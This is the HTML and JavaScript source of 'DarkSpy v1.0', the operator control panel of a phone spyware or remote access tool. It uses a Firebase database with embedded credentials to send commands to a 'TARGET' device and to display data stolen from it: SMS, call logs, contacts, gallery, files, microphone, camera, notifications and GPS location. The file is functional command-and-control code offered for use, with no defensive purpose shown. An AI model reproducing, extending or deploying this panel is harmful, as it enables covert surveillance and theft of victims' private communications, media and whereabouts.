<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>DarkSpy v1.0 - dark master</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root { --red: #ff0000; --bg: #000; --green: #00ff41; }
        body { background: var(--bg); color: var(--green); font-family: 'Courier New', monospace; margin: 0; overflow-x: hidden; }
        #dots-canvas { position: fixed; top: 0; left: 0; z-index: -1; width: 100%; height: 100%; opacity: 0.6; }
        
        .header { border-bottom: 2px solid var(--red); padding: 10px 20px; display: flex; justify-content: space-between; align-items: center; background: #000; position: sticky; top: 0; z-index: 100; }
        .glitch-time { color: var(--red); font-size: 14px; font-weight: 900; }

        .main-layout { padding: 15px; max-width: 950px; margin: auto; position: relative; z-index: 1; }
        .branding { text-align: center; margin-bottom: 20px; }
        .branding img { width: 95px; border: 2px solid var(--red); border-radius: 50%; box-shadow: 0 0 20px red; }
        .branding h1 { color: var(--red); letter-spacing: 6px; font-size: 22px; text-shadow: 0 0 10px red; font-weight: 900; }

        .control-unit { border: 2.5px solid var(--red); background: rgba(35, 0, 0, 0.9); padding: 15px; margin-bottom: 20px; }
        .unit-title { color: var(--red); font-size: 12px; font-weight: bold; border-bottom: 1.5px solid var(--red); display: block; padding-bottom: 6px; margin-bottom: 12px; }
        .ctrl-btn { background: #000; color: var(--green); border: 2px solid var(--red); padding: 10px 15px; cursor: pointer; font-size: 11px; margin: 5px; font-weight: 900; }
        .ctrl-btn:hover { background: var(--red); color: #000; box-shadow: 0 0 10px red; }

        .gps-frame { border: 2.5px solid var(--red); height: 180px; position: relative; overflow: hidden; margin-bottom: 20px; background: #000; }
        .radar-scan { position: absolute; top: 50%; left: 50%; width: 500px; height: 500px; background: conic-gradient(from 0deg, rgba(255,0,0,0.4) 0%, transparent 45%); transform: translate(-50%, -50%); animation: rotate 3.5s linear infinite; border-radius: 50%; }
        @keyframes rotate { from { transform: translate(-50%, -50%) rotate(0deg); } to { transform: translate(-50%, -50%) rotate(360deg); } }

        .info-bar { background: rgba(25,0,0,0.95); border: 2px solid var(--red); padding: 15px; display: flex; justify-content: space-around; margin-bottom: 20px; font-size: 14px; font-weight: 900; color: #fff; }

        .button-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 12px; }
        .btn-vault { background: rgba(0,0,0,0.9); border: 2px solid var(--red); padding: 22px 2px; text-align: center; cursor: pointer; transition: 0.2s; }
        .btn-vault:hover { background: var(--red); box-shadow: 0 0 20px red; }
        .btn-vault i { color: var(--red); font-size: 24px; display: block; margin-bottom: 10px; }
        .btn-vault span { color: var(--green); font-size: 11px; font-weight: 900; }
        .btn-vault:hover i, .btn-vault:hover span { color: #000; }

        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 1000; border: 4px solid var(--red); }
        .data-card { background: #0a0a0a; border-left: 6px solid var(--red); padding: 15px; margin-bottom: 15px; border: 1.5px solid #333; box-shadow: 0 0 15px rgba(255,0,0,0.2); }
        .data-line { margin: 8px 0; border-bottom: 1px solid #1a1a1a; padding-bottom: 5px; display: flex; justify-content: space-between; font-size: 14px; font-weight: bold; }
        .data-key { color: var(--red); text-transform: uppercase; }
        .data-val { color: var(--green); }
        
        .card-image { max-width: 100%; height: auto; border: 1.5px solid var(--red); display: block; margin: 10px auto; box-shadow: 0 0 15px rgba(255,0,0,0.4); }

        @media (max-width: 600px) { .button-grid { grid-template-columns: repeat(3, 1fr); } }
    </style>
</head>
<body>
    <canvas id="dots-canvas"></canvas>
    <div class="header">
        <div style="display:flex; align-items:center; gap:10px;">
            <img src="https://i.postimg.cc/RCYbwpF3/favicon.png" width="30">
            <span style="color:var(--red); font-weight:bold; font-size:18px;">DARKSPY <span style="color:white">V1.0</span></span>
        </div>
        <div class="glitch-time">>_ <span id="clock">00:00:00</span></div>
    </div>

    <div class="main-layout">
        <div class="branding">
            <img src="https://i.postimg.cc/htJrxvX0/Screenshot-20260205-060223.png">
            <h1>DARK OF MASTER</h1>
        </div>

        <div class="control-unit">
            <span class="unit-title">>_ REMOTE_CONTROL_CENTER</span>
            <button class="ctrl-btn" onclick="sendCommand('vibrate')">VIBRATE</button>
            <button class="ctrl-btn" onclick="sendCommand('show_toast')">ALERT</button>
            <button class="ctrl-btn" onclick="sendCommand('get_location')">SYNC GPS</button>
            <button class="ctrl-btn" onclick="sendCommand('flash_light')">FLASH</button>
        </div>

        <div class="gps-frame">
            <div class="radar-scan"></div>
            <div style="height: 100%; background: url('https://i.postimg.cc/mD8P8p7y/radar-map.gif') center/cover; opacity: 0.4;"></div>
        </div>

        <div class="info-bar">
            <span id="target-id">TARGET: ...</span>
            <span id="batt-info" style="color:var(--red);">BATT: --%</span>
            <span id="device-model">MODEL: ...</span>
        </div>

        <div class="button-grid">
            <div class="btn-vault" onclick="openVault('sms')"><i class="fa-solid fa-envelope"></i><span>SMS LOGS</span></div>
            <div class="btn-vault" onclick="openVault('call_history')"><i class="fa-solid fa-phone"></i><span>CALLS</span></div>
            <div class="btn-vault" onclick="openVault('contacts')"><i class="fa-solid fa-users"></i><span>CONTACTS</span></div>
            <div class="btn-vault" onclick="openVault('gallery')"><i class="fa-solid fa-images"></i><span>GALLERY</span></div>
            <div class="btn-vault" onclick="openVault('files')"><i class="fa-solid fa-folder-open"></i><span>FILES</span></div>
            <div class="btn-vault" onclick="openVault('mic')"><i class="fa-solid fa-microphone"></i><span>MIC</span></div>
            <div class="btn-vault" onclick="openVault('camera')"><i class="fa-solid fa-camera"></i><span>CAMERA</span></div>
            <div class="btn-vault" onclick="openVault('logolog')"><i class="fa-solid fa-terminal"></i><span>LIVE LOGS</span></div>
            <div class="btn-vault" onclick="openVault('apps')"><i class="fa-solid fa-cubes"></i><span>APPS</span></div>
            <div class="btn-vault" onclick="openVault('notifications')"><i class="fa-solid fa-bell"></i><span>NOTIFS</span></div>
            <div class="btn-vault" onclick="openVault('location')"><i class="fa-solid fa-map-pin"></i><span>GPS</span></div>
            <div class="btn-vault" onclick="openVault('info')"><i class="fa-solid fa-microchip"></i><span>SYSTEM</span></div>
        </div>
    </div>

    <div id="modal" class="modal">
        <div style="padding:15px; border-bottom:2px solid red; display:flex; justify-content:space-between; background: #080808;">
            <span id="m-title" style="color:red; font-size:16px; font-weight:900;">[ DECRYPTING DATA HACKED... ]</span>
            <button onclick="document.getElementById('modal').style.display='none'" style="background:red; color:white; border:none; padding:8px 20px; cursor:pointer; font-weight:bold;">[ EXIT ]</button>
        </div>
        <div id="m-body" style="padding:20px; overflow-y:auto; height:85%;"></div>
    </div>

    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <script>
        const firebaseConfig = { apiKey: "AIzaSyA5-E06ArKA7Unf-fHtCflOEwu2p8VM9kI", authDomain: "dark-5b7c9.firebaseapp.com", databaseURL: "https://dark-5b7c9-default-rtdb.firebaseio.com", projectId: "dark-5b7c9", storageBucket: "dark-5b7c9.firebasestorage.app", messagingSenderId: "1029612020880", appId: "1:1029612020880:web:1d2d6f3ee96af0cf06a415" };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();
        
        const vId = new URLSearchParams(window.location.search).get('id') || "default_id";
        document.getElementById('target-id').innerText = "TARGET: " + vId;

        setInterval(() => { document.getElementById('clock').innerText = new Date().toLocaleTimeString(); }, 1000);

        const canvas = document.getElementById('dots-canvas'); const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
        let dots = Array(110).fill().map(() => ({ x: Math.random()*canvas.width, y: Math.random()*canvas.height, r: 1.4, s: 0.7 }));
        function animate() { ctx.fillStyle = "rgba(0,0,0,0.2)"; ctx.fillRect(0,0,canvas.width, canvas.height); ctx.fillStyle = "rgba(255,0,0,0.55)"; dots.forEach(d => { ctx.beginPath(); ctx.arc(d.x, d.y, d.r, 0, Math.PI*2); ctx.fill(); d.y += d.s; if(d.y > canvas.height) d.y = 0; }); requestAnimationFrame(animate); }
        animate();

        // Device Info Sync
        db.ref('online/onlinetheoneandonly/' + vId + '/device').on('value', snap => {
            const d = snap.val();
            if(d) {
                document.getElementById('device-model').innerText = "MODEL: " + (d.phone || "N/A");
                document.getElementById('batt-info').innerText = "BATT: " + (d.battery || "0") + "%";
            }
        });

        function sendCommand(c) {
            let v = (c === 'show_toast') ? prompt("Message:") : "true";
            db.ref('commands/' + vId).set({ command: c, value: v, time: Date.now(), status: "new_request" });
        }

        function renderDatabaseData(data) {
            if(!data || data === "success") return false;
            let body = document.getElementById('m-body');
            body.innerHTML = "";
            let hasValidData = false;
            
            Object.keys(data).reverse().forEach(key => {
                let item = data[key];
                if(item === "success") return;

                let cardHTML = `<div class="data-card">`;
                let innerContent = "";

                if (typeof item === 'object') {
                    for (let k in item) {
                        let val = String(item[k]);
                        if(val === "success" || val.length < 5) continue; // Skip minor/useless IDs
                        
                        if (val.startsWith('/9j/') || val.startsWith('iVBORw') || k.toLowerCase().includes('icon')) {
                            innerContent += `<div class="data-line"><span class="data-key">${k}</span><span class="data-val">[IMAGE]</span></div>`;
                            innerContent += `<img src="data:image/jpeg;base64,${val}" class="card-image"/>`;
                        } else {
                            innerContent += `<div class="data-line"><span class="data-key">${k}</span><span class="data-val">${val}</span></div>`;
                        }
                    }
                } else {
                    let val = String(item);
                    if(val !== "success" && val.length > 5) {
                        innerContent += `<div class="data-line"><span class="data-val">${val}</span></div>`;
                    }
                }

                if(innerContent !== "") {
                    cardHTML += innerContent + `</div>`;
                    body.innerHTML += cardHTML;
                    hasValidData = true;
                }
            });
            return hasValidData;
        }

        function openVault(type) {
            const body = document.getElementById('m-body');
            document.getElementById('modal').style.display = 'block';
            body.innerHTML = "<p style='color:var(--green); text-align:center'>>_ SCANNING_ENCRYPTED_PATHS...<br>>_ ATTEMPTING_DATA_FETCH...</p>";
            
            db.ref('commands/' + vId).set({ command: 'get_' + type, time: Date.now(), force: true, status: "pending" });

            // Extract pure numeric/alphabetic ID from complex strings
            let pureId = vId.replace('user', '').replace('respo', '');
            let paths = [];

            // Add all possible database paths based on Firebase structures
            if (type === 'logolog') {
                paths.push('logolog/' + pureId);
            } else if (type === 'notifications') {
                paths.push('notilogo/' + pureId);
            } else {
                paths.push('respos/respo' + pureId + '/respo'); // Image 1 style
                paths.push('respos/respo' + pureId);            // Direct respo style
                paths.push(vId + '/' + type);                   // Classic style
                paths.push('respos/' + type + '/' + pureId);    // Alternative folder style
            }

            function tryPaths(idx) {
                if(idx >= paths.length) {
                    body.innerHTML = `<div style="text-align:center; padding:20px; border:1px solid red;">
                        <p style="color:orange;">[!] PATHS_EXHAUSTED / NO_DATA_UPLOADED</p>
                        <p style="color:white; font-size:11px;">Target: ${vId} | Path Checked: ${paths[0]}</p>
                    </div>`;
                    return;
                }

                db.ref(paths[idx]).on('value', snap => {
                    let found = renderDatabaseData(snap.val());
                    if(!found) tryPaths(idx + 1);
                });
            }
            tryPaths(0);
        }
    </script>
</body>
</html>
